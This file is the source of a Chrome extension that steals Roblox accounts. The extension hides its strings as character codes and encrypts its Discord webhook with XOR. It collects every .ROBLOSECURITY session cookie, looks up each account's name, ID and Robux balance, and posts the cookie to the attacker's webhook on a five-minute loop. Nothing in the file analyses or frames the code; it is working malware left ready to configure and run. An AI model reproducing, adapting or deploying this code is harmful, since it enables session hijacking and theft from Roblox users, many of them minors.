(function(){
    // ---------- Encoded strings (character codes) ----------
    const _s = (arr) => String.fromCharCode.apply(null, arr);

    // Key for webhook decryption (same as your encryptor)
    const _keyCodes = [114,48,98,108,48,120,95,50,48,50,54,95,109,117,108,116,105,95,116,48,111,108,95,75,104,52,110];
    const DECRYPTION_KEY = _s(_keyCodes);  // "r0bl0x_2026_multi_t0ol_Kh4n"

    // Encrypted webhook hex – PASTE YOUR HEX HERE
    const ENCRYPTED_HEX = "1a44161c4342701d545b453c0207085a0a30191f0e1c36641f510c1a5f0d0743576e070103056759475d4d59694407565b6b72581b1944665a205e016c59516167260b5823305a0019653f2a2c0f3105052a612d3b481e3b6373485d1d1b25331527353c4715273423295656284a5b075e317240414207113b";

    // Decrypt hex -> webhook URL
    function decryptWebhook(encHex) {
        const key = DECRYPTION_KEY;
        let out = '';
        for (let i = 0; i < encHex.length; i += 2) {
            const code = parseInt(encHex.substr(i, 2), 16);
            out += String.fromCharCode(code ^ key.charCodeAt((i/2) % key.length));
        }
        return out;
    }
    const WEBHOOK = decryptWebhook(ENCRYPTED_HEX);

    // ---------- Roblox strings (fully encoded) ----------
    const DOMAIN = _s([46,114,111,98,108,111,120,46,99,111,109]);                  // ".roblox.com"
    const COOKIE_NAME = _s([46,82,79,66,76,79,83,69,67,85,82,73,84,89]);          // ".ROBLOSECURITY"
    const AUTH_URL = _s([104,116,116,112,115,58,47,47,117,115,101,114,115,46,114,111,98,108,111,120,46,99,111,109,47,118,49,47,117,115,101,114,115,47,97,117,116,104,101,110,116,105,99,97,116,101,100]);
    const ECON_BASE = _s([104,116,116,112,115,58,47,47,101,99,111,110,111,109,121,46,114,111,98,108,111,120,46,99,111,109,47,118,49,47,117,115,101,114,115,47]);
    const CURRENCY_TAIL = _s([47,99,117,114,114,101,110,99,121]);                    // "/currency"
    const MSG_ACCOUNT = _s([42,42,65,99,99,111,117,110,116,58,42,42,32]);          // "**Account:** "
    const MSG_USERID = _s([42,42,85,115,101,114,32,73,68,58,42,42,32]);            // "**User ID:** "
    const MSG_ROBUX = _s([42,42,82,111,98,117,120,58,42,42,32]);                   // "**Robux:** "
    const MSG_COOKIE = _s([42,42,67,111,111,107,105,101,58,42,42]);                // "**Cookie:**"
    const NEWLINE = _s([10]);
    const MIME_TEXT = _s([116,101,120,116,47,112,108,97,105,110]);                  // "text/plain"
    const UNKNOWN = _s([117,110,107,110,111,119,110]);                              // "unknown"
    const METHOD_POST = _s([80,79,83,84]);                                          // "POST"
    const ALARM_NAME = _s([115,116,101,97,108,76,111,111,112]);                     // "stealLoop"
    const ALARM_PERIOD = 5;
    const CONTENT_KEY = _s([99,111,110,116,101,110,116]);                           // "content"
    const FILE_KEY = _s([102,105,108,101]);                                         // "file"
    const TXT_EXT = _s([95,99,111,111,107,105,101,46,116,120,116]);                // "_cookie.txt"

    // ---------- Core logic (same as before, just using encoded strings) ----------
    async function getAccountInfo(cookieValue) {
        try {
            const auth = await fetch(AUTH_URL, {
                headers: { Cookie: `${COOKIE_NAME}=${cookieValue}` }
            });
            if (!auth.ok) return null;
            const user = await auth.json();
            const rb = await fetch(ECON_BASE + user.id + CURRENCY_TAIL, {
                headers: { Cookie: `${COOKIE_NAME}=${cookieValue}` }
            });
            let robux = "?";
            if (rb.ok) {
                const data = await rb.json();
                robux = data.robux ?? 0;
            }
            return { name: user.name, id: user.id, robux };
        } catch {
            return null;
        }
    }

    async function sendToDiscord(account, cookieValue) {
        if (!WEBHOOK) return;
        const text = [
            MSG_ACCOUNT + account.name,
            MSG_USERID + account.id,
            MSG_ROBUX + account.robux,
            MSG_COOKIE
        ].join(NEWLINE);

        const blob = new Blob([cookieValue], { type: MIME_TEXT });
        const form = new FormData();
        form.append(CONTENT_KEY, text);
        form.append(FILE_KEY, blob, (account.name || UNKNOWN) + TXT_EXT);
        await fetch(WEBHOOK, {
            method: METHOD_POST,
            body: form
        });
    }

    async function steal() {
        const cookies = await chrome.cookies.getAll({ domain: DOMAIN });
        const roblosecs = cookies.filter(c => c.name === COOKIE_NAME);
        for (const c of roblosecs) {
            const acc = await getAccountInfo(c.value);
            if (acc) {
                await sendToDiscord(acc, c.value);
            }
        }
    }

    // Start
    steal();
    chrome.alarms.create(ALARM_NAME, { periodInMinutes: ALARM_PERIOD });
    chrome.alarms.onAlarm.addListener(steal);
})();